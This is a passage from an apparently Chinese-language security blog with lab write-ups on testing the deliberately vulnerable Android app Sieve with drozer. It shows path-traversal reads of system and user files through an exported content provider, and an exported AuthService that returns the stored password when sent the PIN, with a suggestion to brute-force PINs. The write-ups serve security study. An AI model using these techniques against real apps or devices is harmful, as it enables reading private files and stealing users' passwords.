</span></span><span style=display:flex><span>            modeCode <span style=color:#f92672>=</span> 805306368;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            Log.<span style=color:#a6e22e>w</span>(TAG, <span style=color:#e6db74>&#34;Unrecognised code to open file: &#34;</span> <span style=color:#f92672>+</span> mode);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> ParcelFileDescriptor.<span style=color:#a6e22e>open</span>(<span style=color:#66d9ef>new</span> File(uri.<span style=color:#a6e22e>getPath</span>()), modeCode);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (FileNotFoundException e) {
</span></span><span style=display:flex><span>            Log.<span style=color:#a6e22e>e</span>(TAG, <span style=color:#e6db74>&#34;ERROR: unable to open file: &#34;</span> <span style=color:#f92672>+</span> e.<span style=color:#a6e22e>getMessage</span>());
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div></li><li>實際讀取文件或是Path Traversal
為了測試他真的能夠讀取到特定文件，我在手機的Download創了一個secret.txt，不管是哪一個file，都可以正常讀取<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#e6db74>&#34;this is secret file&#34;</span> &gt; /storage/emulated/0/Download/secret.txt
</span></span><span style=display:flex><span>dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/storage/emulated/0/Download/secret.txt
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>this is secret file
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>127.0.0.1       localhost
</span></span><span style=display:flex><span>::1             ip6-localhost
</span></span></code></pre></div>也可以利用drozer自動找尋path traversal的漏洞在哪裡<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning com.mwr.example.sieve...
</span></span><span style=display:flex><span>Not Vulnerable:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Vulnerable Providers:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.FileBackupProvider
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.FileBackupProvider/
</span></span></code></pre></div></li></ol></p></article><article class="markdown book-post"><h2><a href=/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/>Test Sieve - is debuggable</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a></div><p><h1 id=test-sieve---is-debuggable>Test Sieve - is debuggable
<a class=anchor href=#test-sieve---is-debuggable>#</a></h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.package.debuggable
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: org.owasp.goatdroid.fourgoats
</span></span><span style=display:flex><span>  UID: <span style=color:#ae81ff>10286</span>
</span></span><span style=display:flex><span>  Permissions:
</span></span><span style=display:flex><span>   - None.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Package: com.mwr.example.sieve
</span></span><span style=display:flex><span>  UID: <span style=color:#ae81ff>10285</span>
</span></span><span style=display:flex><span>  Permissions:
</span></span><span style=display:flex><span>   - None.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Package: com.withsecure.dz
</span></span><span style=display:flex><span>  UID: <span style=color:#ae81ff>10284</span>
</span></span><span style=display:flex><span>  Permissions:
</span></span><span style=display:flex><span>   - None.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Package: jakhar.aseem.diva
</span></span><span style=display:flex><span>  UID: <span style=color:#ae81ff>10282</span>
</span></span><span style=display:flex><span>  Permissions:
</span></span><span style=display:flex><span>   - None.
</span></span></code></pre></div></p></article><article class="markdown book-post"><h2><a href=/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/>Test Sieve - services exported</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a></div><p><h1 id=test-sieve---services-exported>Test Sieve - services exported
<a class=anchor href=#test-sieve---services-exported>#</a></h1><ol><li>列出exported services有哪些<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.service.info -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: com.mwr.example.sieve
</span></span><span style=display:flex><span>  com.mwr.example.sieve.AuthService
</span></span><span style=display:flex><span>    Permission: null
</span></span><span style=display:flex><span>  com.mwr.example.sieve.CryptoService
</span></span><span style=display:flex><span>    Permission: null
</span></span></code></pre></div></li><li>逆向
從以上可以知道有兩個service是被export的，這樣的話就可以逆一下判斷可以送出什麼東西以及可能的漏洞在哪，按照教學的說明我直接看==AuthService==這個service，
在<code>com.mwr.example.sieve.AuthService</code>中的其中一段就是有問題的地方:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>AuthService</span> <span style=color:#66d9ef>extends</span> Service {
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MessageHandler</span> <span style=color:#66d9ef>extends</span> Handler {
</span></span><span style=display:flex><span>        ...
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>handleMessage</span>(Message msg) {
</span></span><span style=display:flex><span>            ...
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>switch</span> (msg.<span style=color:#a6e22e>what</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> 4:
</span></span><span style=display:flex><span>                    ...
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> AuthService.<span style=color:#a6e22e>MSG_CHECK</span> <span style=color:#75715e>/* 2354 */</span>:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (msg.<span style=color:#a6e22e>arg1</span> <span style=color:#f92672>==</span> AuthService.<span style=color:#a6e22e>TYPE_KEY</span>) {
</span></span><span style=display:flex><span>                        responseCode3 <span style=color:#f92672>=</span> 42;
</span></span><span style=display:flex><span>                        String recievedString <span style=color:#f92672>=</span> returnBundle.<span style=color:#a6e22e>getString</span>(<span style=color:#e6db74>&#34;com.mwr.example.sieve.PASSWORD&#34;</span>);
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (AuthService.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>verifyKey</span>(recievedString)) {
</span></span><span style=display:flex><span>                            AuthService.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>showNotification</span>();
</span></span><span style=display:flex><span>                            returnVal2 <span style=color:#f92672>=</span> 0;
</span></span><span style=display:flex><span>                        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                            returnVal2 <span style=color:#f92672>=</span> 1;
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (msg.<span style=color:#a6e22e>arg1</span> <span style=color:#f92672>==</span> AuthService.<span style=color:#a6e22e>TYPE_PIN</span>) {
</span></span><span style=display:flex><span>                        responseCode3 <span style=color:#f92672>=</span> 41;
</span></span><span style=display:flex><span>                        String recievedString2 <span style=color:#f92672>=</span> returnBundle.<span style=color:#a6e22e>getString</span>(<span style=color:#e6db74>&#34;com.mwr.example.sieve.PIN&#34;</span>);
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (AuthService.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>verifyPin</span>(recievedString2)) {
</span></span><span style=display:flex><span>                            returnBundle <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Bundle();
</span></span><span style=display:flex><span>                            returnBundle.<span style=color:#a6e22e>putString</span>(<span style=color:#e6db74>&#34;com.mwr.example.sieve.PASSWORD&#34;</span>, AuthService.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>getKey</span>());
</span></span><span style=display:flex><span>                            returnVal2 <span style=color:#f92672>=</span> 0;
</span></span><span style=display:flex><span>                        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                            returnVal2 <span style=color:#f92672>=</span> 1;
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        sendUnrecognisedMessage();
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    sendResponseMessage(5, responseCode3, returnVal2, returnBundle);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>                ...
</span></span></code></pre></div>首先在msg.what=2354且msg.arg1=AuthService.TYPE_PIN的地方，若程式讀取到的<code>com.mwr.example.sieve.PIN</code>的value(也就是PIN Code)，經過verifyPin這個function比對過後一致，則他會return一個bundle，內涵<code>com.mwr.example.sieve.PASSWORD</code>以及我們之前設定的password，並且回傳response message給我們
→[5, 41, 0, {com.mwr.example.sieve.PASSWORD:&lt;password>}]
而這個問題在哪裡呢?經過前期的確認以及逆向，我們可以寫個script爆破，不斷送出一些pin code給這個service，則因為大多時候PIN Code的複雜度比較低，所以總有一天可以得到使用者的密碼了</li><li>和service互動
從下面的結果來看，一開始設定的密碼為==123456acitseccom==<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg <span style=color:#ae81ff>2354</span> <span style=color:#ae81ff>9234</span> <span style=color:#ae81ff>1</span> --extra string com.mwr.example.sieve.PIN &lt;User PIN&gt; --bundle-as-obj
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
</span></span><span style=display:flex><span>  what: <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>  arg1: <span style=color:#ae81ff>41</span>
</span></span><span style=display:flex><span>  arg2: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>  Extras
</span></span><span style=display:flex><span>    com.mwr.example.sieve.PASSWORD <span style=color:#f92672>(</span>String<span style=color:#f92672>)</span> : 123456acitseccom
</span></span></code></pre></div></li></ol></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></div></aside></main></body></html>